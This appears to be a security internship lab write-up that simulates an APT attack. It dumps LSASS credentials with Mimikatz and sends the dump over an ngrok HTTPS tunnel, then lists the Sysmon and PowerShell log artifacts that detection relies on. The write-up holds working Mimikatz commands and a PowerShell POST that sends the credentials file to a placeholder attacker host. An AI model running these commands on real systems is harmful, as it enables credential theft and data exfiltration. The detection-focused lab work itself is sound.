# Scenario 5: Credential Dumping & HTTPS Exfiltration (APT Simulation)

## Simulated Activity:
Simulate real-world attacker behavior involving credential dumping from LSASS using Mimikatz, followed by data exfiltration over a secure HTTPS channel — a common stealth tactic in advanced persistent threat (APT) operations.

---

## Tools Used:
- **Windows 10** (Target machine)
- **Python3 HTTP Server** (initial attempt)
- **ngrok** (for HTTPS tunneling)
- **Mimikatz** (Credential extraction)
- **Wireshark** (Network packet capture)
- **Sysmon + PowerShell Logging** (Log detection)

---

## Simulation Steps:

## 1. Credential Dumping with Mimikatz:
### **File transferred** to target Windows machine using Python HTTP server:
```powershell
Invoke-WebRequest -Uri "http://<Kali-IP>:8000/mimikatz.exe" -OutFile "C:\temp\mimikatz.exe"
```

### Executed with Admin privileges:
```powershell
cd C:\temp

.\mimikatz.exe

log C:\temp\creds.txt

privilege::debug
sekurlsa::logonpasswords

exit
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_creds_dumped_using_mimikatz.png)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_creds_dumped_to_creds.txt.png)

- Output saved in C:\temp\creds.txt using Mimikatz’s built-in logging.

## 2. Simulating Encrypted Exfiltration:
### Ngrok tunnel established on Kali to simulate HTTPS attacker server:
```bash
ngrok http 443
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_creds_dump_and_https_exfiltration_simulated.png)

### Exfiltration Command from Windows:
```powershell
Invoke-WebRequest -Uri "https://<ngrok-address>" -Method POST -InFile "C:\temp\creds.txt"
```
- Response: 404 Not Found (✅ expected, since no backend receiver)
- ngrok console confirmed incoming HTTPS POST request from Windows.
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_creds.txt_sent_to_ngrok-free.app.png)

## Logs & Forensics Observed:
|Source|Artifact|
|------|--------|
|Sysmon|Event ID 1(Process Creation), event ID 3 (Network Connection) and Event ID 22(DNS Query)|
|Powershell|Command logs for file download and POST request|
|ngrok|POST request captured with timestamp|


mimikatz.exe File Created Sysmon log
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_mimikatz.exe_file_created_log.png)
Network connect to port 443 Sysmon log
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_network_connect_to_443_log.png)
DNS Query to ngrok Sysmon log Event ID 22
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_dns_query_to_ngrok-free.app.png)
Exfiltration command Powershell log
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_data_exfiltration_powershell_log.png)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint05_data_exfiltration_404error_powershell_log.png)

### Key Insight:
This task highlights how encrypted exfiltration over HTTPS can blend in with legitimate traffic, making it significantly harder to detect. Even though the file never reached a server, the act of exfiltration was successfully simulated and logged — which is the critical aspect in threat hunting.
